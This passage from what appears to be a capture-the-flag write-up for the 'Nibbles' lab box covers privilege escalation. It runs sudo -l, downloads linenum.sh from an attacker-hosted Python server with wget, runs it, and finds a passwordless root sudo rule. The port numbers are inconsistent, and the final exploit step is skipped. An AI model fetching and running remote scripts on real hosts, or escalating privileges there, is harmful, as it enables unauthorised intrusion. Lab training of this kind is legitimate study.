ok, we're in lets privesc. Given how small this box is we can pretty easily find that /personal/stuff/monitor.sh can be run as root without a password by nibbler but in case you missed that run 
```
nibbler@nibbles$sudo -l


```
instead lets upload linenum.sh to practice. set up a web server with python real quick using the following
```
n00blfye@htb$ sudo python3 -m http.server 8080

Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:8080)

```

on the remote machine run the following 
```
nibbler@nibbles$wget http://<ATTACKER_IP>:80/linenum.sh
--2026-09-03 15:03:26--  http://<ATTACKER_IP>:8080/linenum.sh
Connecting to <ATTACKER_IP>:8080... connected.
HTTP request sent, awaiting response... 200 OK
Length: 46631 (46K) [text/x-sh]
Saving to: 'linenum.sh'

linenum.sh          100%[===================>]  45.54K  --.-KB/s    in 0.1s    

2026-09-03 15:03:27 (345 KB/s) - 'linenum.sh' saved [46631/46631]

nibbler@nibbles$ chmod +x linenum.sh
nibbler@nibbles$./linenum.sh


```

in the output we will see
```
[+] We can sudo without supplying a password!
Matching Defaults entries for nibbler on Nibbles:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User nibbler may run the following commands on Nibbles:
    (root) NOPASSWD: /home/nibbler/personal/stuff/monitor.sh


[+] Possible sudo pwnage!
/home/nibbler/personal/stuff/monitor.sh


```

we see that monitor.sh can be exploited for root privileges

critically
```
IT IS CRUCIAL IF WE EVER ENCOUNTER A SITUATION WHERE WE CAN LEVERAGE A WRITEABLE FILE FOR PRIVILEGE ESCALATION. WE ONLY APPEND TO THE END OF THE FILE (AFTER MAKING A BACKUP COPY) TO AVOID OVERWRITING IT AND CAUSING A DISRUPTION
```

From here we grab the root flag and are successful.